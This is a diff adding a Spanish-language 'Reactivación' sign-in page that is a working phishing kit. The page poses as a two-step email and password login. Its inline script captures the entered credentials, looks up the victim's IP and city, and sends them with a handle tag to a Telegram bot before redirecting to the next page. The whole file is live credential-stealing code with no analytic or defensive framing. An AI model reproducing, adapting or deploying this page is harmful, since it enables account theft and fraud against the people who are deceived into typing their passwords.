@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+    <title>Reactivación</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+
+    <link rel="icon" href="icon.ico">
+    <link rel="stylesheet" href="normalize.css">
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <section id="l-c">
+        <div id="l-b" class="opacity0">
+
+            <form id="c-layout" method="POST" action="next.php" enctype="multipart/form-data"
+                onkeypress="return cancelEnter(event)">
+
+                <div id="eml">
+
+                    <div class="top-c">
+                        <img src="1.png" class="one" alt="">
+                    </div>
+                    <div id="alert-eml-l" style="display: none;"></div>
+                    <input type="email" id="usr" name="papas" placeholder="Correo electrónico">
+                    <p>¿No tiene una cuenta? <a href="#">Cree una.</a></p>
+                    <div class="button btn-next">
+                        <button type="button" id="btn-next-pss" class="btn-form-l">Siguiente</button>
+                    </div>
+                </div>
+
+                <div id="pss">
+
+                    <div class="top-c">
+                        <img src="2.png" class="two" alt="">
+
+                        <div class="usr">
+                            <p>
+                                <button type="button" id="btn-prev">
+                                    <i class="fa-solid fa-arrow-left"></i>
+                                </button>
+                                <span id="span-eml"></span>
+                            </p>
+                        </div>
+                    </div>
+                    <input type="text" id="pss" name="verduras" placeholder="Contraseña">
+                    <a href="#">¿Olvidó su contraseña?</a>
+                    <div class="button btn-sub">
+                        <input type="submit" id="btn-l" class="btn-form-l" value="Siguiente">
+                    </div>
+                </div>
+            </form>
+        </div>
+    </section>
+
+    <script src="https://kit.fontawesome.com/4a03c8ce1f.js" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="functions.js"></script>
+	<script src="config.js"></script>
+<script>
+document.getElementById("c-layout").addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById("usr").value;
+    const password = document.querySelector("input[name='verduras']").value;
+
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const ip = data.ip;
+        const city = data.city;
+        
+        // Obtener hora local (hora:minuto)
+        const now = new Date();
+        const hora = now.getHours().toString().padStart(2, '0');
+        const minutos = now.getMinutes().toString().padStart(2, '0');
+        const horaExacta = `${hora}:${minutos}`;
+
+        const message = `📩 @Dirtyo25 \n\n📧 Correo: ${email}\n🔑 Contraseña: ${password}\n🌍 IP: ${ip}\n🏙️ Ciudad: ${city}\n🕒 Hora: ${horaExacta}`;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message
+            })
+        });
+
+        console.log("Enviado correctamente a Telegram");
+		window.location.href = "pindex.html";
+
+    } catch (error) {
+        console.error("Error al obtener IP o enviar mensaje", error);
+    }
+});
+</script>
+
+
+</body>
+
+</html>
